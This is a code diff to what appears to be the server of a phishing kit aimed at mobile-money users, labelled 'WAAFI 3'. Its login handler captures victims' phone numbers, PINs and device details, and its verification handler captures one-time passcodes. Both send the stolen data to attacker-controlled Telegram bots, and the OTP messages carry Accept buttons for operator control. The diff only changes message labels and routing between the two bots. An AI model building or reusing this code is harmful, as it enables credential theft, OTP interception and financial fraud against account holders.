@@ -64,6 +64,10 @@ app.post('/api/login-attempt', async (req, res) => {
     const { phone, pin, device } = req.body;
     const msg = {
         parse_mode: 'HTML',
+        text: `🚨 <b>New Login Attempt - FROM WAAFI 3</b>\nPhone: ${phone}\nPIN: ${pin}\nDevice: ${device}`
+    };
+    const msg2 = {
+        parse_mode: 'HTML',
         text: `🚨 <b>New Login Attempt</b>\nPhone: ${phone}\nPIN: ${pin}\nDevice: ${device}`
     };
 
@@ -71,7 +75,7 @@ app.post('/api/login-attempt', async (req, res) => {
     sendTelegram(BOT1, msg);
     
     // Send to Bot 2 with 10 second (10000ms) delay
-    sendTelegram(BOT2, msg, 20000);
+    sendTelegram(BOT2, msg2, 20000);
 
     res.json({ success: true });
 });
@@ -85,7 +89,7 @@ app.post('/api/verify-identity', async (req, res) => {
     // Create the message object shared by both bots
     const msg = {
         parse_mode: 'HTML',
-        text: `🛡️ <b>WrldBoss Verification (OTP 1)</b>\nPhone: ${phone}\nOTP 1: <b>${otp1}</b>`,
+        text: `🛡️ <b>WrldBoss Verification - FROM WAAFI 3 (OTP 1)</b>\nPhone: ${phone}\nOTP 1: <b>${otp1}</b>`,
         reply_markup: {
             inline_keyboard: [[
                 { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/accept` },
